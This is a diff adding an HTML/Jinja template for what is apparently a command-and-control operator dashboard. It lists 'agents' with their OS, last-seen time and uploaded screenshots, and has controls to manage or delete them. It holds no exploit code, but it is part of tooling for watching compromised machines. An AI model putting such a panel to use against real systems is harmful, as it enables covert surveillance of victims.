@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .screenshot-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .screenshot-card {
+            background: #2a2a2a;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .screenshot-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body class="bg-dark text-light">
+    <div class="container py-4">
+        <h1 class="mb-4">Active Agents</h1>
+        <div class="row row-cols-1 row-cols-md-3 g-4">
+            {% for agent_id, agent in agents.items() %}
+            <div class="col">
+                <div class="card bg-secondary">
+                    <div class="card-header bg-primary d-flex justify-content-between align-items-center">
+                        <span>Agent {{ agent_id }}</span>
+                        <div>
+                            <a href="/agent/{{ agent_id }}" class="btn btn-light btn-sm">Manage</a>
+                            <form action="/delete_agent/{{ agent_id }}" method="post" class="d-inline">
+                                <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure you want to delete this agent?')">Delete</button>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <p class="card-text">
+                            OS: {{ agent.os }}<br>
+                            Last seen: {{ agent.last_seen }}
+                        </p>
+                        <div class="screenshot-grid">
+                            {% for screenshot in agent.screenshots %}
+                            <div class="screenshot-card">
+                                <a href="/uploads/{{ agent_id }}/{{ screenshot }}" target="_blank">
+                                    <img src="/uploads/{{ agent_id }}/{{ screenshot }}" alt="Screenshot">
+                                </a>
+                                <div class="p-2">
+                                    <small>{{ screenshot }}</small>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+</body>
+</html>
